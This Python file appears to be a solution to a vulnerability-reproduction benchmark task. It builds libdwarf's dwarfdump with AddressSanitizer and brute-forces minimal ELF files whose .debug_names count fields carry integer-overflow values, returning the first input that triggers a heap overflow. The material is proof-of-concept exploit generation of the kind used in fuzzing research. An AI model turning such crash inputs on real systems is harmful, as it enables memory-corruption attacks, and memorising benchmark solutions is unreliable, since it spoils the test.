import os
import sys
import struct
import subprocess
import tempfile
import shutil
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        build_dir = tempfile.mkdtemp()
        try:
            # Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(path=build_dir)
            
            src_root = build_dir
            # Detect actual source root if nested
            entries = os.listdir(build_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(build_dir, entries[0])):
                src_root = os.path.join(build_dir, entries[0])
            
            # Configure and Build
            env = os.environ.copy()
            env['CFLAGS'] = "-g -fsanitize=address"
            env['CXXFLAGS'] = "-g -fsanitize=address"
            env['LDFLAGS'] = "-fsanitize=address"
            
            # Build libdwarf and dwarfdump
            subprocess.run(["./configure", "--disable-shared"], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            subprocess.run(["make", "-j8"], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            
            # Find dwarfdump executable
            dwarfdump_bin = None
            possible_paths = [
                os.path.join(src_root, "src", "bin", "dwarfdump", "dwarfdump"),
                os.path.join(src_root, "dwarfdump", "dwarfdump")
            ]
            for p in possible_paths:
                if os.path.exists(p) and os.access(p, os.X_OK):
                    dwarfdump_bin = p
                    break
            
            if not dwarfdump_bin:
                for root, dirs, files in os.walk(src_root):
                    if "dwarfdump" in files:
                        path = os.path.join(root, "dwarfdump")
                        if os.access(path, os.X_OK):
                            dwarfdump_bin = path
                            break
            
            if not dwarfdump_bin:
                raise Exception("dwarfdump binary not found")

            # Fuzzing Strategy
            # Target: .debug_names heap buffer overflow via integer overflow in count fields
            # Fields: comp_unit_count, local_type_unit_count, foreign_type_unit_count, 
            #         bucket_count, name_count, abbrev_table_size, augmentation_string_size
            
            vals = [
                0x40000000, 0x40000001, # x*4 overflow
                0x20000000, 0x20000001, # x*8 overflow
                0x80000000, 0xFFFFFFFF, # Max values
                0x10000000,             # Large value
                100                     # Small valid
            ]
            
            # 1. Try single field corruption
            for idx in range(7):
                for val in vals:
                    counts = [0] * 7
                    counts[idx] = val
                    poc = self.generate_poc(counts)
                    if self.check_crash(dwarfdump_bin, poc):
                        return poc
            
            # 2. Try bucket_count + name_count combinations
            for v1 in vals:
                for v2 in vals:
                    counts = [0] * 7
                    counts[3] = v1 # bucket
                    counts[4] = v2 # name
                    poc = self.generate_poc(counts)
                    if self.check_crash(dwarfdump_bin, poc):
                        return poc

            # 3. Try comp_unit + bucket
            for v1 in vals:
                for v2 in vals:
                    counts = [0] * 7
                    counts[0] = v1 # comp
                    counts[3] = v2 # bucket
                    poc = self.generate_poc(counts)
                    if self.check_crash(dwarfdump_bin, poc):
                        return poc

        except Exception:
            pass
        finally:
            shutil.rmtree(build_dir, ignore_errors=True)
            
        return b""

    def check_crash(self, binary, data):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(data)
            fname = f.name
        try:
            # -n prints debug_names and triggers parsing
            res = subprocess.run([binary, "-n", fname], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
            if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
                return True
        except subprocess.TimeoutExpired:
            pass
        finally:
            if os.path.exists(fname):
                os.remove(fname)
        return False

    def generate_poc(self, counts):
        # Create .debug_names section content
        # Format: unit_length(4), version(2)=5, padding(2), 7 counts(4 each)
        payload = struct.pack("<H2xIIIIIII", 5, *counts)
        unit_length = len(payload)
        section_data = struct.pack("<I", unit_length) + payload
        return self.create_elf(section_data)

    def create_elf(self, debug_names_data):
        # Minimal ELF 64-bit generator
        e_ident = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        
        ehdr_size = 64
        phdr_size = 56
        
        offset = ehdr_size + phdr_size
        
        dn_offset = offset
        dn_size = len(debug_names_data)
        offset += dn_size
        
        shstr = b"\x00.debug_names\x00.shstrtab\x00"
        shstr_offset = offset
        shstr_size = len(shstr)
        offset += shstr_size
        
        padding = (8 - (offset % 8)) % 8
        offset += padding
        shoff = offset
        
        # Section Headers
        sh_null = b"\x00" * 64
        
        # .debug_names header
        sh_dn = struct.pack("<IIQQQQIIQQ", 1, 1, 0, 0, dn_offset, dn_size, 0, 0, 1, 0)
        
        # .shstrtab header
        sh_shstr = struct.pack("<IIQQQQIIQQ", 14, 3, 0, 0, shstr_offset, shstr_size, 0, 0, 1, 0)
        
        shdrs = sh_null + sh_dn + sh_shstr
        
        e_shnum = 3
        e_shstrndx = 2
        
        elf_hdr = struct.pack("<16sHHIQQQIHHHHHH", e_ident, 2, 62, 1, 0x400000, 64, shoff, 0, 64, 56, 1, 64, e_shnum, e_shstrndx)
        
        filesz = offset + len(shdrs)
        phdr = struct.pack("<IIQQQQQQ", 1, 4, 0, 0x400000, 0x400000, filesz, filesz, 0x1000)
        
        return elf_hdr + phdr + debug_names_data + shstr + (b"\x00" * padding) + shdrs
